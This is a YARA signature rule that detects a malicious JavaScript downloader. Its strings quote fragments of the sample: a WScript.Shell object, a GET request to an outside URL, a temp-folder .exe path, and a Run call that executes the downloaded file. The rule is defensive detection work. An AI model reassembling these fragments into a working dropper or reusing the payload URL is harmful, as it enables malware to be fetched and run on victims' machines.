rule sig_20160328_20fcbdc8cd37599a9f276392f67ece46 {
  meta:
    description = "datamaliciousorder - file 20160328_20fcbdc8cd37599a9f276392f67ece46.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "648e840b5da469ef4729ca157fdc46d654c4f19a744bf5707ace592b95de75e3"

  strings:
    $s1  = "function Pdbocdzs() {return Vyjxal[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"321gVnp2EAQwiTVS.exe\";};" fullword ascii
    $s2  = "do {WScript[Xidon](Qzrujd() * 11)} while (Mtollwg[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Bgmbmo(Ixyumsd, Ayldocw){return Ixyumsd - Ayldocw;};" fullword ascii
    $s4  = "var Vyjxal = function Pyvzlnv() {return WScript[Ibpjxvvpq](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Mtollwg[Almuyhhkm](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s6  = "function Tglge() {return ((Kuvjbvkqx == true) && (Kuvjbvkqx == Llqlyspze)) ? 1 : Rbbmad;};" fullword ascii
    $s7  = "function Icbaihg(Myecxkv){Vyjxal[\"Run\"](Myecxkv, Rbbmad, Rbbmad);};" fullword ascii
    $s8  = "function Fhvlszq()" fullword ascii
    $s9  = "Kuvjbvkqx = true; " fullword ascii
    $s10 = "function Qnwjkbjfls(Xeooljnsm) {var Jevorhjtqq = (1, 2, 3, 4, 5, Xeooljnsm); return Jevorhjtqq;};" fullword ascii
    $s11 = "var Llqlyspze = false;" fullword ascii
    $s12 = "function Qzrujd(){return 22;};" fullword ascii
    $s13 = "function Uvtwijk(){return Ibpjxvvpq;};" fullword ascii
    $s14 = "var Smfpevvm = new this[\"Date\"]();" fullword ascii
    $s15 = "var Xjdegotre = false;" fullword ascii
    $s16 = "function Rkcjpxcrh(){return Qlppoy;};" fullword ascii
    $s17 = " while (Odizjwgmf){" fullword ascii
    $s18 = "Llqlyspze = true; " fullword ascii
    $s19 = "return Bgmbmo(Zkcyykftnt, Jvhpyt);" fullword ascii
    $s20 = "var Kuvjbvkqx = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}